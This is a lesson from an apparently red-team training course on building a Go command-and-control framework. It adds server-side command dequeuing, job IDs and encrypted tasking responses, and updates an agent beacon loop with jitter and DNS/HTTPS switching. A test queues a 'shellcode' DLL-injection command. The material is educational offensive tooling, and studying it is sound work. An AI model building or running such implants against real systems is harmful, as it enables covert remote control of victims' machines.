---
layout: course01
title: "Lesson 16: Dequeue and Send Commands"
---


## Solutions

- **Starting Code:** [lesson_16_begin](https://github.com/faanross/antisyphon_course_c2_golang/tree/master/lesson_16_begin)
- **Completed Code:** [lesson_16_end](https://github.com/faanross/antisyphon_course_c2_golang/tree/master/lesson_16_end)

## Overview

Commands are now being queued, but the agent doesn't know about them yet. When the agent checks in (hits our root endpoint), we need to:

1. Check if there's a command waiting in the queue
2. If yes, retrieve it and remove it from the queue
3. Generate a unique job ID for tracking
4. Send the command to the agent
5. If no, tell the agent there's nothing to do

In this lesson, we'll:

1. Create a new response type for server-to-agent communication
2. Implement a method to retrieve and remove commands from the queue
3. Update the RootHandler to check the queue and respond appropriately
4. Update the agent to parse and display the new response format

## What We'll Create

- `ServerResponse` type in `server/models.go`
- `GetCommand()` method in `command_api.go`
- Updated `RootHandler` in `server/server.go`
- Updated `Send()` method in `agent/agent.go`
- Updated `RunLoop` in `agent/runloop.go`

## Create ServerResponse Type

Right now, our server sends a response to the agent that only tells it **Change**, or **Don't Change**, from `server/server_https.go` we have:

```go
// HTTPSResponse represents the JSON response for HTTPS
type HTTPSResponse struct {
	Change bool `json:"change"`
}

```

But we need to add to this, since we are not not just communicating switch or not, but also whether there is a job. Specifically:
- Is there a job?
- If yes, what's the job ID, command, and arguments?

So let's build on this:

```go
// HTTPSResponse represents the JSON response for HTTPS
type HTTPSResponse struct {
	Change bool `json:"change"`
	Job       bool            `json:"job"`
	JobID     string          `json:"job_id,omitempty"`
	Command   string          `json:"command,omitempty"`
	Arguments json.RawMessage `json:"data,omitempty"`
}
```

**Understanding the fields:**

1. **Job** - Boolean indicating if there's a command to execute
    - `false` = No commands in queue, agent should sleep
    - `true` = Command available, agent should execute it
2. **JobID** - Unique identifier for this specific command execution
    - Only included when `Job` is `true` (note the `omitempty` tag)
    - Allows tracking results back to specific commands
    - Critical for multi-agent, multi-command scenarios
3. **Command** - The command keyword (e.g., "shellcode")
    - Only included when `Job` is `true`
4. **Arguments** - The processed command arguments as raw JSON
    - Only included when `Job` is `true`
    - Contains the base64 shellcode data, not the file path

**Understanding `omitempty`:** The `omitempty` JSON tag means "don't include this field if it's empty." When `Job` is `false`, we don't need JobID, Command, or Arguments, so the JSON will just be:

```json
{
"change": false
"job": false
}
```

When `Job` is `true`, we get the full structure:

```json
{
  "change": false
  "job": true,
  "job_id": "job_123456",
  "command": "shellcode",
  "data": {...}
}
```

## Why Do We Need Job IDs?

In our simple workshop, job IDs might seem unnecessary. But consider a real-world scenario:

```
Time | Action
-----|-------------------------------------------------------
T1   | Command 1 queued: "Download sensitive.doc"
T2   | Command 2 queued: "Upload database.sql"
T3   | Agent checks in, gets Command 1 (JobID: job_001)
T4   | Agent checks in, gets Command 2 (JobID: job_002)
T5   | Agent sends results for job_002 (Upload succeeded)
T6   | Agent sends results for job_001 (Download failed)
```

Without job IDs, how would you know which result corresponds to which command? Job IDs provide traceability, especially when:

- Multiple agents are operating
- Commands execute at different speeds
- Results arrive out of order
- You need to correlate logs and debug issues

## Implement GetCommand Method

Now we need a method to retrieve and remove commands from the queue. Add this to `command_api.go`:

```go
// GetCommand retrieves and removes the next command from queue
func (cq *CommandQueue) GetCommand() (CommandClient, bool) {
	cq.mu.Lock()
	defer cq.mu.Unlock()

	if len(cq.PendingCommands) == 0 {
		return CommandClient{}, false
	}

	cmd := cq.PendingCommands[0]
	cq.PendingCommands = cq.PendingCommands[1:]

	log.Printf("DEQUEUED: Command '%s'", cmd.Command)

	return cmd, true
}
```

### Check if queue is empty

```go
if len(cq.PendingCommands) == 0 {
    return models.CommandClient{}, false
}
```

If there are no commands, return an empty struct and `false` to indicate nothing available.

### Get the first command

```go
cmd := cq.PendingCommands[0]
```

Access the command at index 0 (the front of the queue).

### Remove it from the queue

```go
cq.PendingCommands = cq.PendingCommands[1:]
```

This is the idiomatic Go way to remove the first element from a slice:

- `[1:]` means "slice from index 1 to the end"
- This creates a new slice without the first element
- The original first element is now removed

### Return the command

```go
return cmd, true
```

Return the command and `true` to indicate a command was available.

## Update RootHandler

Now let's update the server's root endpoint handler to check the queue and respond appropriately. Let's add to the `RootHandler` function in `server/server_https.go`:

```go
func RootHandler(secret string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)

		// Read encrypted body
		encryptedBody, err := io.ReadAll(r.Body)
		if err != nil {
			http.Error(w, "Error reading body", http.StatusBadRequest)
			return
		}

		log.Printf("Payload pre-decryption: %s", string(encryptedBody))

		// Decrypt the payload
		plaintext, err := crypto.Decrypt(string(encryptedBody), secret)
		if err != nil {
			log.Printf("Decryption failed: %v", err)
			http.Error(w, "Decryption failed", http.StatusBadRequest)
			return
		}

		log.Printf("Payload post-decryption: %s", string(plaintext))

		var response HTTPSResponse

		// FIRST, check if there are pending commands
		cmd, exists := control.AgentCommands.GetCommand()
		if exists {
			log.Printf("Sending command to agent: %s\n", cmd.Command)
			response.Job = true
			response.Command = cmd.Command
			response.Arguments = cmd.Arguments
			response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
			log.Printf("Job ID: %s\n", response.JobID)
		} else {
			log.Printf("No commands in queue")
		}

		// THEN, check if we should transition
		shouldChange := control.Manager.CheckAndReset()

		if shouldChange {
			response.Change = true
			log.Printf("HTTPS: Sending transition signal (change=true)")
		} else {
			log.Printf("HTTPS: Normal response (change=false)")
		}

		// Marshal response to JSON
		responseJSON, err := json.Marshal(response)
		if err != nil {
			log.Printf("Error marshaling response: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		// Encrypt the response
		encryptedResponse, err := crypto.Encrypt(responseJSON, secret)
		if err != nil {
			log.Printf("Error encrypting response: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		// Set content type to octet-stream for encrypted data
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write([]byte(encryptedResponse))
	}
}
```

### Create empty response

```go
var response HTTPSResponse
```

By default, all fields are zero values (`Job` and `Change` are `false`, strings are empty).

### Check the queue

```go
cmd, exists := control.AgentCommands.GetCommand()
```

Try to get a command from the global queue. Returns:

- `cmd` - The command (or empty struct if none)
- `exists` - Boolean indicating if a command was available

### If command exists, populate response

```go
    if exists {
        log.Printf("Sending command to agent: %s\n", cmd.Command)
        response.Job = true
        response.Command = cmd.Command
        response.Arguments = cmd.Arguments
        response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
        log.Printf("Job ID: %s\n", response.JobID)
    }
```

### Job ID generation

```go
fmt.Sprintf("job_%06d", rand.Intn(1000000))
```

- `rand.Intn(1000000)` - Random number from 0 to 999,999
- `%06d` - Format as 6-digit decimal with leading zeros
- Result: "job_000001", "job_123456", "job_999999", etc.

Note: In production, we'd use a more robust ID system (UUID, database sequence, etc.), but this is sufficient for our workshop.

### If no command, log it

```go
else {
    log.Printf("No commands in queue")
}
```

The response remains with `Job = false`, which is what we want.

### Code for Change

```go
	// THEN, check if we should transition
	shouldChange := control.Manager.CheckAndReset()

	if shouldChange {
		response.Change = true
		log.Printf("HTTPS: Sending transition signal (change=true)")
	} else {
		log.Printf("HTTPS: Normal response (change=false)")
	}
```

This logic is essentially the same as before, one small difference is that we don't initialize the struct here, but above, so we just slightly adjust logic to take account of this.

### Send the response

```go
if err := json.NewEncoder(w).Encode(response); err != nil {
```

Marshal and send the response as JSON, same as it was before.

## Update Interface

Back in RunLoop(), we now have to take account for the fact that the DNS and HTTPS servers no longer return the same response type.

The DNS server's response only has 1 field - `change` - whereas of course now the HTTPS server has a number of other fields.

Now in RunLoop we have this line:

```go
response, err := currentAgent.Send(ctx)
```

Right now it's returning a byte slice, which we then work with further in the logic. However, this is fine if there is a single field, but since it could also have multiple fields we really want to unmarshall into either the DNS or HTTP server response struct so we have access to individual fields in case of the latter.

Now we need to do this in a way where it will account for the fact that the structs for DNS and HTTPS differ from one another, so essentially we want to change the return type from byte slice to "generic struct". In Go we do this by using `json.RawMessage`.

So first in `agent/models.go`, let's change the interface signature so we are now returning `json.RawMessage`.

```go
// Agent defines the contract for agents
type Agent interface {
	// Send sends a message and waits for a response
	Send(ctx context.Context) (json.RawMessage, error)
}
```

Now of course we'll need to update both signatures as well from `agent_dns.go` and `agent_https.go:`

```go
func (c *DNSAgent) Send(ctx context.Context) (json.RawMessage, error) {
```

```go
func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
```

Great, but we also need to change the actual functions now of course so they return this.

## Change DNS's Send()

Now it originally returned a []byte, but in order to satisfy an interface I had to change it json.RawMessage. As you can see from the code it extracts the A record response IP and returns that, so instead let's have a json with one field "ip", and that value in there please.

Here's the adjusted method that returns a proper JSON structure:

```go
// Send implements Agent.Send for DNS
func (c *DNSAgent) Send(ctx context.Context) (json.RawMessage, error) {
    // Create DNS query message
    m := new(dns.Msg)

    // For now, we'll query for a fixed domain
    domain := "www.thisdoesnotexist.com."
    m.SetQuestion(domain, dns.TypeA)
    log.Printf("Sending DNS query for: %s", domain)

    // Send query
    r, _, err := c.client.Exchange(m, c.serverAddr)
    if err != nil {
       return nil, fmt.Errorf("DNS exchange failed: %w", err)
    }

    // Check if we got an answer
    if len(r.Answer) == 0 {
       return nil, fmt.Errorf("no answer received")
    }

    // Extract the first A record
    for _, ans := range r.Answer {
       if a, ok := ans.(*dns.A); ok {
          // Return the IP address in JSON format
          ipStr := a.A.String()
          log.Printf("Received DNS response: %s -> %s", domain, ipStr)

          response := map[string]string{"ip": ipStr}
          jsonData, err := json.Marshal(response)
          if err != nil {
             return nil, fmt.Errorf("failed to marshal response: %w", err)
          }
          return json.RawMessage(jsonData), nil
       }
    }

    return nil, fmt.Errorf("no A record in response")
}
```

The key changes:

1. Created a `map[string]string` with the "ip" field
2. Used `json.Marshal()` to convert it to JSON bytes
3. Cast the result to `json.RawMessage` to satisfy the return type

This will return JSON like: `{"ip":"192.0.2.1"}`

## Change HTTPS's Send()

However it is getting a response that is different, a JSON body, that is in this shape

```go
// HTTPSResponse represents the JSON response for HTTPS
type HTTPSResponse struct {
    Change    bool            `json:"change"`
    Job       bool            `json:"job"`
    JobID     string          `json:"job_id,omitempty"`
    Command   string          `json:"command,omitempty"`
    Arguments json.RawMessage `json:"data,omitempty"`
}
```

That is from package server. So I think we need to create a server.HTTPSResponse and unmarshal into it and return that as json.RawMessage

Here's the adjusted HTTP Send method:

```go
// Send implements Communicator.Send for HTTPS
func (c *HTTPSAgent) Send(ctx context.Context) (json.RawMessage, error) {
    url := fmt.Sprintf("https://%s/", c.serverAddr)

    // Prepare check-in data (could include agent ID, status, etc.)
    checkInData := map[string]interface{}{
       "status": "active",
    }

    plaintext, _ := json.Marshal(checkInData)

    // Encrypt the payload
    encryptedBody, err := crypto.Encrypt(plaintext, c.sharedSecret)
    if err != nil {
       return nil, fmt.Errorf("encrypting payload: %w", err)
    }

    // Create request with encrypted body
    req, err := http.NewRequestWithContext(ctx, "POST", url,
       strings.NewReader(encryptedBody))
    if err != nil {
       return nil, fmt.Errorf("creating request: %w", err)
    }

    req.Header.Set("Content-Type", "application/octet-stream")

    // Sign the request (from previous lesson)
    SignRequest(req, []byte(encryptedBody), c.sharedSecret)

    resp, err := c.client.Do(req)
    if err != nil {
       return nil, fmt.Errorf("sending request: %w", err)
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
       return nil, fmt.Errorf("server returned status %d", resp.StatusCode)
    }

    // Read encrypted response
    encryptedResponse, err := io.ReadAll(resp.Body)
    if err != nil {
       return nil, fmt.Errorf("reading response: %w", err)
    }

    // Decrypt response
    decrypted, err := crypto.Decrypt(string(encryptedResponse), c.sharedSecret)
    if err != nil {
       return nil, fmt.Errorf("decrypting response: %w", err)
    }

    // Unmarshal into HTTPSResponse to validate structure
    var httpsResp server.HTTPSResponse
    if err := json.Unmarshal(decrypted, &httpsResp); err != nil {
       return nil, fmt.Errorf("unmarshaling response: %w", err)
    }

    // Marshal back to json.RawMessage
    jsonData, err := json.Marshal(httpsResp)
    if err != nil {
       return nil, fmt.Errorf("marshaling response: %w", err)
    }

    return json.RawMessage(jsonData), nil
}
```

This approach:

1. Reads the response body as before
2. Unmarshals it into `server.HTTPSResponse` to validate the structure
3. Marshals it back to JSON bytes
4. Returns it as `json.RawMessage`

This ensures the response conforms to the expected structure and provides better error handling if the server returns malformed JSON.

## Now Finally We Also Need to Make Some Adjustments to RunLoop

Now obviously following this:

```
response, err := currentAgent.Send(ctx)
```

We now get back json.RawMessage and depending on whether its https or dns, it looks differently.

For now I still just want it focused on detecting transition, this is obviously for DNS, for HTTPS there are now of course other fields beyond Change, don't worry about this, I just want you to rework this logic to handle the fact that it has now returned a json.RawMessage no []byte

Here's the adjusted code:

```go
// CalculateSleepDuration calculates the actual sleep time with jitter
func CalculateSleepDuration(baseDelay time.Duration, jitterPercent int) time.Duration {
    if jitterPercent == 0 {
       return baseDelay
    }

    // Calculate jitter range
    jitterRange := float64(baseDelay) * float64(jitterPercent) / 100.0

    // Random value between -jitterRange and +jitterRange
    jitter := (rand.Float64()*2 - 1) * jitterRange

    // Calculate final duration
    finalDuration := float64(baseDelay) + jitter

    // Ensure we don't go negative
    if finalDuration < 0 {
       finalDuration = 0
    }

    return time.Duration(finalDuration)
}

func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {

    // ADD THESE TWO LINES:
    currentProtocol := cfg.Protocol // Track which protocol we're using
    currentAgent := comm            // Track current agent (can change!)

    for {
       // Check if context is cancelled
       select {
       case <-ctx.Done():
          log.Println("Run loop cancelled")
          return nil
       default:
       }

       response, err := currentAgent.Send(ctx)

       if err != nil {
          log.Printf("Error sending request: %v", err)
          // Don't exit - just sleep and try again
          time.Sleep(cfg.Timing.Delay)
          continue // Skip to next iteration
       }

       // Check if this is a transition signal
       if detectTransition(currentProtocol, response) {
          log.Printf("TRANSITION SIGNAL DETECTED! Switching protocols...")

          // Figure out what protocol to switch TO
          newProtocol := "dns"
          if currentProtocol == "dns" {
             newProtocol = "https"
          }

          // Create config for new protocol
          tempConfig := *cfg // Copy the config
          tempConfig.Protocol = newProtocol

          // Try to create new agent
          newAgent, err := NewAgent(&tempConfig)
          if err != nil {
             log.Printf("Failed to create %s agent: %v", newProtocol, err)
             // Don't switch if we can't create agent
          } else {
             // Update our tracking variables
             log.Printf("Successfully switched from %s to %s", currentProtocol, newProtocol)
             currentProtocol = newProtocol
             currentAgent = newAgent
          }
       } else {
          // Normal response - parse and log as before
          switch currentProtocol { // Note: use currentProtocol, not cfg.Protocol
          case "https":
             var httpsResp server.HTTPSResponse
             json.Unmarshal(response, &httpsResp)
             log.Printf("Received response: change=%v", httpsResp.Change)
          case "dns":
             // DNS response is now JSON with "ip" field
             var dnsResp struct {
                IP string `json:"ip"`
             }
             json.Unmarshal(response, &dnsResp)
             log.Printf("Received response: IP=%v", dnsResp.IP)
          }
       }

       // Calculate sleep duration with jitter
       sleepDuration := CalculateSleepDuration(time.Duration(cfg.Timing.Delay), cfg.Timing.Jitter)
       log.Printf("Sleeping for %v", sleepDuration)

       // Sleep with cancellation support
       select {
       case <-time.After(sleepDuration):
          // Continue to next iteration
       case <-ctx.Done():
          log.Println("Run loop cancelled")
          return nil
       }
    }
}

// detectTransition checks if the response indicates we should switch protocols
func detectTransition(protocol string, response json.RawMessage) bool {
    switch protocol {
    case "https":
       var httpsResp server.HTTPSResponse
       if err := json.Unmarshal(response, &httpsResp); err != nil {
          return false
       }
       return httpsResp.Change

    case "dns":
       // DNS response is now JSON with "ip" field
       var dnsResp struct {
          IP string `json:"ip"`
       }
       if err := json.Unmarshal(response, &dnsResp); err != nil {
          return false
       }
       return dnsResp.IP == "69.69.69.69"
    }

    return false
}
```

Key changes:

1. Changed `detectTransition` to accept `json.RawMessage` instead of `[]byte`
2. Updated DNS parsing to unmarshal the JSON with the "ip" field structure
3. Both detection and logging now properly handle the JSON structure for DNS responses

Great, so now our code is refactored to process the new type of struct received from HTTPS.

Now finally in RunLoop, let's start the journey of what to do in case Job is `true`.

## Update RunLoop to Detect Job

One thing now is we need to decide what comes first
- Check for job or
- Check for transition

IMO, since jobs only happen with HTTPS, we need to first do a job and then transition in the rare cases that both were requested in the same response.

Meaning simply that logic will come first.

For now I won't implement the actual logic, but just add some placeholder that will form the pattern which we can integrate our command handling system into.

So we'll add this logic

```go
		// Check if there is a job (in case of HTTPS)
		if currentProtocol == "https" {
			var httpsResp server.HTTPSResponse
			if err := json.Unmarshal(response, &httpsResp); err != nil {
				log.Printf("Error unmarshaling HTTPS response: %v", err)
			} else {
				if httpsResp.Job {
					log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", httpsResp.Command, httpsResp.JobID)
				} else {
					log.Printf("No job from Server")
				}
			}
		}
```

Now it properly unmarshals the `json.RawMessage` into a `server.HTTPSResponse` struct so you can access the `Job`, `Command`, and `JobID` fields.

So now our entire RunLoop becomes

```go

func RunLoop(ctx context.Context, comm Agent, cfg *config.AgentConfig) error {

	// ADD THESE TWO LINES:
	currentProtocol := cfg.Protocol // Track which protocol we're using
	currentAgent := comm            // Track current agent (can change!)

	for {
		// Check if context is cancelled
		select {
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		default:
		}

		response, err := currentAgent.Send(ctx)

		if err != nil {
			log.Printf("Error sending request: %v", err)
			// Don't exit - just sleep and try again
			time.Sleep(cfg.Timing.Delay)
			continue // Skip to next iteration
		}

		// Check if there is a job (in case of HTTPS)
		if currentProtocol == "https" {
			var httpsResp server.HTTPSResponse
			if err := json.Unmarshal(response, &httpsResp); err != nil {
				log.Printf("Error unmarshaling HTTPS response: %v", err)
			} else {
				if httpsResp.Job {
					log.Printf("Job received from Server\n-> Command: %s\n-> JobID: %s", httpsResp.Command, httpsResp.JobID)
				} else {
					log.Printf("No job from Server")
				}
			}
		}

		// Check if this is a transition signal
		if detectTransition(currentProtocol, response) {
			log.Printf("TRANSITION SIGNAL DETECTED! Switching protocols...")

			// Figure out what protocol to switch TO
			newProtocol := "dns"
			if currentProtocol == "dns" {
				newProtocol = "https"
			}

			// Create config for new protocol
			tempConfig := *cfg // Copy the config
			tempConfig.Protocol = newProtocol

			// Try to create new agent
			newAgent, err := NewAgent(&tempConfig)
			if err != nil {
				log.Printf("Failed to create %s agent: %v", newProtocol, err)
				// Don't switch if we can't create agent
			} else {
				// Update our tracking variables
				log.Printf("Successfully switched from %s to %s", currentProtocol, newProtocol)
				currentProtocol = newProtocol
				currentAgent = newAgent
			}
		} else {
			// Normal response - parse and log as before
			switch currentProtocol { // Note: use currentProtocol, not cfg.Protocol
			case "https":
				var httpsResp server.HTTPSResponse
				json.Unmarshal(response, &httpsResp)
				log.Printf("Received response: change=%v", httpsResp.Change)
			case "dns":
				// DNS response is now JSON with "ip" field
				var dnsResp struct {
					IP string `json:"ip"`
				}
				json.Unmarshal(response, &dnsResp)
				log.Printf("Received response: IP=%v", dnsResp.IP)
			}
		}

		// Calculate sleep duration with jitter
		sleepDuration := CalculateSleepDuration(time.Duration(cfg.Timing.Delay), cfg.Timing.Jitter)
		log.Printf("Sleeping for %v", sleepDuration)

		// Sleep with cancellation support
		select {
		case <-time.After(sleepDuration):
			// Continue to next iteration
		case <-ctx.Done():
			log.Println("Run loop cancelled")
			return nil
		}
	}
}
```

## Test

Let's test the complete flow!

First make sure in `configs/config.yaml` that protocol is set to https.

**Start the server:**

```bash
go run ./cmd/server
```

**Start the agent:**

```bash
go run ./cmd/agent
```

**Initial agent output (no commands queued):**

```bash
2025/11/06 15:37:49 Starting Agent Run Loop
2025/11/06 15:37:49 Delay: 5s, Jitter: 50%
2025/11/06 15:37:49 No job from Server
2025/11/06 15:37:49 Sleeping for 5.22541057s
2025/11/06 15:37:54 No job from Server
2025/11/06 15:37:54 Sleeping for 6.748574669s
```

**Server output (agent checking in):**

```bash
2025/11/06 15:37:49 Endpoint / has been hit by agent
2025/11/06 15:37:49 No commands in queue
2025/11/06 15:37:54 Endpoint / has been hit by agent
2025/11/06 15:37:54 No commands in queue
```

**Now queue a command (in another terminal):**

```bash
curl -X POST http://localhost:8080/command \
  -d '{
    "command": "shellcode",
    "data": {
      "file_path": "./payloads/calc.dll",
      "export_name": "LaunchCalc"
    }
  }'
```

**Server output after queuing:**

```bash
2025/11/06 15:38:03 Received command: shellcode
2025/11/06 15:38:03 Validation passed: file_path=./payloads/calc.dll, export_name=LaunchCalc
2025/11/06 15:38:03 Processed file: ./payloads/calc.dll (111493 bytes) -> base64 (148660 chars)
2025/11/06 15:38:03 Processed command arguments: shellcode
2025/11/06 15:38:03 QUEUED: shellcode
2025/11/06 15:38:04 Endpoint / has been hit by agent
2025/11/06 15:38:04 DEQUEUED: Command 'shellcode'
2025/11/06 15:38:04 Sending command to agent: shellcode
2025/11/06 15:38:04 Job ID: job_411895
```

**Agent output after command sent:**

```bash
2025/11/06 15:38:04 Job received from Server
-> Command: shellcode
-> JobID: job_411895
2025/11/06 15:38:04 Sleeping for 3.454947595s
2025/11/06 15:38:08 No job from Server
```

**Analyzing the flow:**

1. Agent periodically checks in -> Server responds "No commands"
2. Operator queues command via curl -> Command validated, processed, queued
3. Agent checks in -> Server dequeues command and sends it to agent
4. Agent receives command with job ID
5. Agent continues checking in -> Server responds "No commands" (queue is empty now)

Perfect! The complete loop is working.

## Understanding the Complete Flow

Let's trace a command through the entire system:

1. **Operator -> Server:** curl sends command with file path
2. **Server processing:** Validates, processes (file -> base64), queues
3. **Agent -> Server:** Agent checks in via GET request
4. **Server -> Agent:** Dequeues command, generates job ID, sends response
5. **Agent receives:** Parses response, displays command and job ID
6. **Command execution:** (Next lessons) Agent will execute the command
7. **Agent -> Server:** (Next lessons) Agent sends results back with job ID

## Conclusion

In this lesson, we've implemented the server-to-agent communication:

- Created the `ServerResponse` type for structured responses
- Implemented `GetCommand()` to retrieve and remove commands from the queue
- Updated `RootHandler` to check the queue and respond appropriately
- Updated the agent's `Send()` method to parse the new response structure
- Updated `RunLoop` to display job information
- Tested the complete flow from queue to agent

Our system can now:

- Receive and queue commands
- Dequeue commands when the agent checks in
- Send commands with job IDs to the agent
- Handle both "job available" and "no job" scenarios

The agent now receives commands, but doesn't execute them yet. In the next lessons, we'll implement the agent-side command execution infrastructure!

---

<div style="display: flex; justify-content: space-between; margin-top: 2rem;">
<div><a href="/courses/course01/lesson-15">← Previous: Lesson 15</a></div>
<div><a href="/courses/course01">↑ Table of Contents</a></div>
<div><a href="/courses/course01/lesson-17">Next: Lesson 17 →</a></div>
</div>